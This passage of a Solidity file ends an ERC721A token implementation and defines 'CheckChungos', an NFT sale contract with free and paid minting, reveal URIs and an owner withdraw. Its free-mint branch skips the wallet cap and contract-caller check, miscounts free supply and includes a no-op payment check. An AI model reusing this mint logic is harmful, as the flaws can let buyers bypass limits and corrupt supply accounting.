1122         _operatorApprovals[_msgSender()][operator] = approved;
1123         emit ApprovalForAll(_msgSender(), operator, approved);
1124     }
1125 
1126     /**
1127      * @dev See {IERC721-isApprovedForAll}.
1128      */
1129     function isApprovedForAll(address owner, address operator)
1130         public
1131         view
1132         virtual
1133         override
1134         returns (bool)
1135     {
1136         return _operatorApprovals[owner][operator];
1137     }
1138 
1139     /**
1140      * @dev See {IERC721-transferFrom}.
1141      */
1142     function transferFrom(
1143         address from,
1144         address to,
1145         uint256 tokenId
1146     ) public virtual override {
1147         _transfer(from, to, tokenId);
1148     }
1149 
1150     /**
1151      * @dev See {IERC721-safeTransferFrom}.
1152      */
1153     function safeTransferFrom(
1154         address from,
1155         address to,
1156         uint256 tokenId
1157     ) public virtual override {
1158         safeTransferFrom(from, to, tokenId, "");
1159     }
1160 
1161     /**
1162      * @dev See {IERC721-safeTransferFrom}.
1163      */
1164     function safeTransferFrom(
1165         address from,
1166         address to,
1167         uint256 tokenId,
1168         bytes memory _data
1169     ) public override {
1170         _transfer(from, to, tokenId);
1171         require(
1172             _checkOnERC721Received(from, to, tokenId, _data),
1173             "ERC721A: transfer to non ERC721Receiver implementer"
1174         );
1175     }
1176 
1177     /**
1178      * @dev Returns whether `tokenId` exists.
1179      *
1180      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1181      *
1182      * Tokens start existing when they are minted (`_mint`),
1183      */
1184     function _exists(uint256 tokenId) internal view returns (bool) {
1185         return tokenId < currentIndex;
1186     }
1187 
1188     function _safeMint(address to, uint256 quantity) internal {
1189         _safeMint(to, quantity, "");
1190     }
1191 
1192     /**
1193      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1194      *
1195      * Requirements:
1196      *
1197      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1198      * - `quantity` must be greater than 0.
1199      *
1200      * Emits a {Transfer} event.
1201      */
1202     function _safeMint(
1203         address to,
1204         uint256 quantity,
1205         bytes memory _data
1206     ) internal {
1207         _mint(to, quantity, _data, true);
1208     }
1209 
1210     /**
1211      * @dev Mints `quantity` tokens and transfers them to `to`.
1212      *
1213      * Requirements:
1214      *
1215      * - `to` cannot be the zero address.
1216      * - `quantity` must be greater than 0.
1217      *
1218      * Emits a {Transfer} event.
1219      */
1220     function _mint(
1221         address to,
1222         uint256 quantity,
1223         bytes memory _data,
1224         bool safe
1225     ) internal {
1226         uint256 startTokenId = currentIndex;
1227         require(to != address(0), "ERC721A: mint to the zero address");
1228         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1229 
1230         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1231 
1232         // Overflows are incredibly unrealistic.
1233         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1234         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1235         unchecked {
1236             _addressData[to].balance += uint128(quantity);
1237             _addressData[to].numberMinted += uint128(quantity);
1238 
1239             _ownerships[startTokenId].addr = to;
1240             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1241 
1242             uint256 updatedIndex = startTokenId;
1243 
1244             for (uint256 i; i < quantity; i++) {
1245                 emit Transfer(address(0), to, updatedIndex);
1246                 if (safe) {
1247                     require(
1248                         _checkOnERC721Received(
1249                             address(0),
1250                             to,
1251                             updatedIndex,
1252                             _data
1253                         ),
1254                         "ERC721A: transfer to non ERC721Receiver implementer"
1255                     );
1256                 }
1257 
1258                 updatedIndex++;
1259             }
1260 
1261             currentIndex = updatedIndex;
1262         }
1263 
1264         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1265     }
1266 
1267     /**
1268      * @dev Transfers `tokenId` from `from` to `to`.
1269      *
1270      * Requirements:
1271      *
1272      * - `to` cannot be the zero address.
1273      * - `tokenId` token must be owned by `from`.
1274      *
1275      * Emits a {Transfer} event.
1276      */
1277     function _transfer(
1278         address from,
1279         address to,
1280         uint256 tokenId
1281     ) private {
1282         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1283 
1284         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1285             getApproved(tokenId) == _msgSender() ||
1286             isApprovedForAll(prevOwnership.addr, _msgSender()));
1287 
1288         require(
1289             isApprovedOrOwner,
1290             "ERC721A: transfer caller is not owner nor approved"
1291         );
1292 
1293         require(
1294             prevOwnership.addr == from,
1295             "ERC721A: transfer from incorrect owner"
1296         );
1297         require(to != address(0), "ERC721A: transfer to the zero address");
1298 
1299         _beforeTokenTransfers(from, to, tokenId, 1);
1300 
1301         // Clear approvals from the previous owner
1302         _approve(address(0), tokenId, prevOwnership.addr);
1303 
1304         // Underflow of the sender's balance is impossible because we check for
1305         // ownership above and the recipient's balance can't realistically overflow.
1306         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1307         unchecked {
1308             _addressData[from].balance -= 1;
1309             _addressData[to].balance += 1;
1310 
1311             _ownerships[tokenId].addr = to;
1312             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1313 
1314             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1315             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1316             uint256 nextTokenId = tokenId + 1;
1317             if (_ownerships[nextTokenId].addr == address(0)) {
1318                 if (_exists(nextTokenId)) {
1319                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1320                     _ownerships[nextTokenId].startTimestamp = prevOwnership
1321                         .startTimestamp;
1322                 }
1323             }
1324         }
1325 
1326         emit Transfer(from, to, tokenId);
1327         _afterTokenTransfers(from, to, tokenId, 1);
1328     }
1329 
1330     /**
1331      * @dev Approve `to` to operate on `tokenId`
1332      *
1333      * Emits a {Approval} event.
1334      */
1335     function _approve(
1336         address to,
1337         uint256 tokenId,
1338         address owner
1339     ) private {
1340         _tokenApprovals[tokenId] = to;
1341         emit Approval(owner, to, tokenId);
1342     }
1343 
1344     /**
1345      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1346      * The call is not executed if the target address is not a contract.
1347      *
1348      * @param from address representing the previous owner of the given token ID
1349      * @param to target address that will receive the tokens
1350      * @param tokenId uint256 ID of the token to be transferred
1351      * @param _data bytes optional data to send along with the call
1352      * @return bool whether the call correctly returned the expected magic value
1353      */
1354     function _checkOnERC721Received(
1355         address from,
1356         address to,
1357         uint256 tokenId,
1358         bytes memory _data
1359     ) private returns (bool) {
1360         if (to.isContract()) {
1361             try
1362                 IERC721Receiver(to).onERC721Received(
1363                     _msgSender(),
1364                     from,
1365                     tokenId,
1366                     _data
1367                 )
1368             returns (bytes4 retval) {
1369                 return retval == IERC721Receiver(to).onERC721Received.selector;
1370             } catch (bytes memory reason) {
1371                 if (reason.length == 0) {
1372                     revert(
1373                         "ERC721A: transfer to non ERC721Receiver implementer"
1374                     );
1375                 } else {
1376                     assembly {
1377                         revert(add(32, reason), mload(reason))
1378                     }
1379                 }
1380             }
1381         } else {
1382             return true;
1383         }
1384     }
1385 
1386     /**
1387      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1388      *
1389      * startTokenId - the first token id to be transferred
1390      * quantity - the amount to be transferred
1391      *
1392      * Calling conditions:
1393      *
1394      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1395      * transferred to `to`.
1396      * - When `from` is zero, `tokenId` will be minted for `to`.
1397      */
1398     function _beforeTokenTransfers(
1399         address from,
1400         address to,
1401         uint256 startTokenId,
1402         uint256 quantity
1403     ) internal virtual {}
1404 
1405     /**
1406      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1407      * minting.
1408      *
1409      * startTokenId - the first token id to be transferred
1410      * quantity - the amount to be transferred
1411      *
1412      * Calling conditions:
1413      *
1414      * - when `from` and `to` are both non-zero.
1415      * - `from` and `to` are never both zero.
1416      */
1417     function _afterTokenTransfers(
1418         address from,
1419         address to,
1420         uint256 startTokenId,
1421         uint256 quantity
1422     ) internal virtual {}
1423 }
1424 
1425 contract CheckChungos is ERC721A, Ownable, ReentrancyGuard {
1426     uint256 public price = 0.001 ether;
1427     uint256 public maxPerTx = 10;
1428     uint256 public maxPerFree = 2;
1429     uint256 public maxPerWallet = 50;
1430     uint256 public totalFree = 2555;
1431     uint256 public maxSupply = 5555;
1432     bool public mintEnabled = true;
1433     uint256 public totalFreeMinted = 0;
1434     bool public revealed = false;
1435     string public baseURI;
1436     string public unrevealedURI="https://ipfs.io/ipfs/QmPzHpsF35cjnfe2ybNU4J5ZLD3QzS7ocfM8ptHPsHsKGX";
1437 
1438     mapping(address => uint256) public _mintedFreeAmount;
1439     mapping(address => uint256) public _totalMintedAmount;
1440 
1441     constructor() ERC721A("Check Chungos", "CC") {
1442         _safeMint(_msgSender(), 5);
1443     }
1444 
1445     function mint(uint256 count) external payable {
1446         uint256 cost = price;
1447         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1448             (_mintedFreeAmount[msg.sender] < maxPerFree));
1449 
1450         if (isFree) {
1451             require(mintEnabled, "Mint is not live yet");
1452             require(totalSupply() + count <= maxSupply, "No more");
1453             require(count <= maxPerTx, "Max per TX reached.");
1454             if (count >= (maxPerFree - _mintedFreeAmount[msg.sender])) {
1455                 require(
1456                     msg.value >=
1457                         (count * cost) -
1458                             ((maxPerFree - _mintedFreeAmount[msg.sender]) *
1459                                 cost),
1460                     "Please send the exact ETH amount"
1461                 );
1462                 _mintedFreeAmount[msg.sender] = maxPerFree;
1463                 totalFreeMinted += maxPerFree;
1464             } else if (count < (maxPerFree - _mintedFreeAmount[msg.sender])) {
1465                 require(msg.value >= 0, "Please send the exact ETH amount");
1466                 _mintedFreeAmount[msg.sender] += count;
1467                 totalFreeMinted += count;
1468             }
1469         } else {
1470             require(mintEnabled, "Mint is not live yet");
1471             require(
1472                 _totalMintedAmount[msg.sender] + count <= maxPerWallet,
1473                 "Exceed maximum NFTs per wallet"
1474             );
1475             require(
1476                 msg.value >= count * cost,
1477                 "Please send the exact ETH amount"
1478             );
1479             require(totalSupply() + count <= maxSupply, "No more");
1480             require(count <= maxPerTx, "Max per TX reached.");
1481             require(msg.sender == tx.origin, "The minter is another contract");
1482         }
1483         _totalMintedAmount[msg.sender] += count;
1484         _safeMint(msg.sender, count);
1485     }
1486 
1487     function tokenURI(uint256 tokenId)
1488         public
1489         view
1490         virtual
1491         override
1492         returns (string memory)
1493     {
1494         require(
1495             _exists(tokenId),
1496             "ERC721Metadata: URI query for nonexistent token"
1497         );
1498         return
1499             revealed
1500                 ? string(abi.encodePacked(baseURI, Strings.toString(tokenId), ".json"))
1501                 : unrevealedURI;
1502     }
1503 
1504     function setUnrevealedURI(string memory uri) public onlyOwner {
1505         unrevealedURI = uri;
1506     }
1507 
1508     function costCheck() public view returns (uint256) {
1509         return price;
1510     }
1511 
1512     function maxFreePerWallet() public view returns (uint256) {
1513         return maxPerFree;
1514     }
1515 
1516     function _baseURI() internal view virtual override returns (string memory) {
1517         return baseURI;
1518     }
1519 
1520     function setBaseUri(string memory baseuri_) public onlyOwner {
1521         baseURI = baseuri_;
1522     }
1523 
1524     function setPrice(uint256 price_) external onlyOwner {
1525         price = price_;
1526     }
1527 
1528     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1529         totalFree = MaxTotalFree_;
1530     }
1531 
1532     function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1533         maxPerFree = MaxPerFree_;
1534     }
1535 
1536     function start() external onlyOwner {
1537         mintEnabled = !mintEnabled;
1538     }
1539 
1540     function withdraw() external onlyOwner nonReentrant {
1541         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1542         require(success, "Transfer failed.");
1543     }
1544 }